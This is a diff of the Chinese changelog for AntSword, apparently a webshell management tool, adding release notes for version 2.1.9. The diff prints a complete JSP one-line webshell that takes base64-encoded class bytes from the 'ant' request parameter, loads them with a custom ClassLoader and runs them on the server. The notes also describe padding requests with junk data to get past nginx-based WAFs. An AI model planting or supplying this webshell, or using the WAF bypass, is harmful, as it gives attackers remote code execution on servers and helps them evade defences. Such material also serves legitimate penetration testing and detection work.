@@ -2,7 +2,44 @@
 > 有空会补补BUG、添添新功能。    
 > 同时也欢迎大家的参与！感谢各位朋友的支持！ .TAT.
 
-## `v2.1.9-dev`
+## 2020/09/10 `v(2.1.9)`
+
+### 核心
+
+* 新增 JSP 类型一句话支持 (**试验功能**)
+
+使用的 Shell 例如：
+
+```
+<%!
+class U extends ClassLoader{
+  U(ClassLoader c){
+    super(c);
+  }
+  public Class g(byte []b){
+    return super.defineClass(b,0,b.length);
+  }
+}
+%>
+<%
+String cls=request.getParameter("ant");
+if(cls!=null){
+  new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext);
+}
+%>
+```
+
+> JSP 类型目前采用硬编码字节码方式, 编译版本为 jdk 1.7, 可根据使用场景自行编译。
+
+代码模版参见: https://github.com/AntSwordProject/AntSword-JSP-Template
+
+**注意**
+
+JSP 类型 Shell 修改文件权限功能，不支持 Windows 系统，在 Linux 系统下不支持 SUID 设置
+
+> 例如设置为 2644 实际上与 0644 效果相同
+
+* 新增其他参数增加随机前缀
 
 ### 后端模块
 
@@ -19,6 +56,16 @@
 该模块不会改变 payload, 仅会填充垃圾数据, 部分基于 nginx 二次开发的 WAF 会因为过多参数导致 WAF 获取不到后面的数据，从而达到 Bypass 目的。
 
 测试 paper 参见: [yzddmr6的 Blog —— 蚁剑改造计划之增加垃圾数据](https://yzddmr6.tk/posts/antsword-diy-1/)
+
+### Security
+
+* Fix ViewSite security issue #256
+
+### 其它
+
+* 插件支持的脚本类型支持通配符 `*`
+
+> 如果插件的 package.json 文件中的 scripts 设置为 `*`, 则可被所有类型的插件调用。
 
 ## 2019/12/04 `v(2.1.8.1)`
 
